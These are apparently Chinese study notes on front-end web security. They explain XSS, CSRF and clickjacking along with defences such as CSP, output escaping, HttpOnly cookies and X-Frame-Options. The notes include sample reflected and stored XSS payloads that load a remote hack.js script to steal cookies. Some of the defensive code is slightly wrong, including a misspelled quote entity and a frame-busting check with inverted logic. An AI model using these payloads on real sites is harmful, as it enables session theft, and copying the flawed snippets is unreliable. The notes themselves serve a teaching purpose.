1. 前端安全
2. 网络安全

## 前端安全
- XSS
- CSRF
- 点击劫持
- SQL注入
- OS注入
- 请求劫持
- DDOS

#### XSS
cross site scripting
跨站脚本攻击
XSS(Cross-Site Scripting), 跨站脚本攻击，因为缩写和CSS重叠，所以只能叫XSS，跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击。
跨站脚本攻击有可能造成以下影响
1. 利用虚假输入表单骗取用户个人信息。
2. 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
3. 显示伪造的文章或图片

XSS 攻击分类
- 反射型 - url 参数直接注入
```
// 普通
http://127.0.0.1:3000?from=china
// alert 尝试
http://127.0.0.1:3000/?from=<script>alert(3)</script>
// 获取cookie
http://127.0.0.1:3000/?from=<script src="http://127.0.0.1:4000/hack.js"></script>
// 短域名伪造 https://dwz.cn/
通过短域名把真实的域名和参数进行覆盖
// 防伪造cookie入侵，chrome
document.cookie="yd:sess=eyj1csadadasdsddasdadd"
```
- 存储型 - 存储到DB后读取时注入
```
// 评论
<script>alert(1)</script>
// 跨站脚本注入
我来了<script src="http://127.0.0.1:4000/hack.js"></script>
```
##### XSS 攻击的危害 - Scripting能干啥就能干啥
1. 获取页面数据
2. 获取Cookies
3. 劫持前端逻辑
4. 发送请求
5. 偷取网站的任意数据
6. 偷取用户的资料
7. 偷取用户的秘密和登录态
8. 欺骗用户

##### 防范手段
ejs 转译小知识
```
<% code %> 用于执行其中javascript代码；
<%= code %> 会对code进行html转译；
<%- code %>将不会进行转译
```

- HEAD
```
ctx.set('X-XSS-Protection', 0);
// 可以拦截url上的注入代码，但是伪装一下就不行了，比如短域名
```
0： 禁止XSS 过滤
1 启用XSS过滤(通常浏览器是默认的)。如果检测到跨站脚本攻击，浏览器将清除页面(删除不安全的部分)
1: mode=block 启用XSS过滤，如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。
1: report=(Chromium only)
启用XSS过滤，如果检测到跨站甲苯攻击，浏览器将清除页面并使用CSP report-uri 指令的功能发送违规报告。

- CSP
CSP本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行，我们只需要配置规则，如何拦截是浏览器自己实现的，我们可以通过这种方式来尽量减少XSS攻击
```
// 只允许加载本站资源
Content-Security-Policy: default-src 'self'
// 只允许加载HTTPS协议图片
Content-Security-Policy: img-src https://*
// 不允许加载任何来源框架
Content-Security-Policy: child-src 'none'

ctx.set('Content-Security-Policy', "default-src 'self'")
// 尝试一下外部资源不能加载
https://127.0.0.1:3000?from=<script src="http://127.0.0.1:4000/hack.js"></script>
```
- 转义字符
用户输入永远不可信任的，最普遍的做法就是转译输出的内容，对于引号，尖括号，斜杠进行转译
```
function escape(str) {
    str = str.replace(/&/g, '&amp;');
    str = str.replace(/</g, '&lt;');
    str = str.replace(/>/g, '&gt;');
    str = str.replace(/"/g, '&quto;');
    str = str.replace(/'/g, '&#39;');
    str = str.replace(/`/g, '&#96;');
    str = str.replace(/\//g, '&#x2F;');
    return str;
}
```
富文本来说，显然不能通过上面的办法来转译所有字符，因为这样会把需要的格式也过滤掉，对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式.
```
const xss = require('xss');
let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss")</script>');
// <h1 id="title">XSS Demo</h1>&lt;script&gt;alert("xss")&lt;/script&gt;
console.log(html);
```
- HttpOnly cookie
这是预防XSS攻击窃取用户cookie最有效的防御手段，Web应用程序在设置cookie时，将其属性设为HttpOnly, 就可以避免该网页的cookie被客户端恶意javaScript窃取，保护用户cookie信息
```
response.addHeader('Set-Cookie', 'uid=112; path/; HttpOnly')
```
- CSRF
CSRF( Cross Site Request Forgery)，即跨站请求伪造，是一种常见的web攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义来完成非法操作。
1. 用户已经登录了站点A, 并在本地记录了cookie
2. 在用户没有退出站点A的情况下(也就是cookie生效的情况下)，访问了恶意攻击者提供的引诱危险站点B，B站点要求访问站点A。
3. 站点A没有做任何CSRF防御

CSRF攻击危害
1. 利用用户登录态
2. 用户不知情
3. 完成业务请求
4. 盗取用户资金(转账，消费)
5. 冒充用户发帖背锅
6. 损害网站声誉

防御
1. 禁止第三方网站带Cookie - 有兼容性问题
2. Referer Check - Https 不发送 referer
3. 验证码

- 点击劫持 - clickjacking
点击劫持是一种视觉欺骗的攻击手段，攻击者将需要攻击的网站通过iframe嵌套的方式嵌入自己的网页中，并将iframe设置为透明，在页面中透出一个按钮诱导用户点击

防御
1. X-FRAME-OPTIONS
X-FRAME-OPTIONS是一个http响应头，在现在浏览器有一个很好的支持，这个http响应头就是为了防御用iframe嵌套的点击劫持攻击。
该响应头有三个值可选分别是
DENY 表示页面不允许通过iframe的方式展示
SAMEORIGIN 标识页面可以在相同域名下通过iframe的方式展示
ALLOW-FROM 表示页面可以在指定来源的iframe中展示
```
ctx.set('X-FRAME-OPTIONS', 'DENY')
```
js 方式
```
if (self == top) {
    document.body = '';
} else {
    top.location = self.location;
}
```
以上代码的作用就是当通过iframe的方式加载页面时，攻击者的网页直接不显示所有内容了。

- SQL注入
```
```

## 防御手段


1. 性能优化
2. 单元测试
1. 前端工程化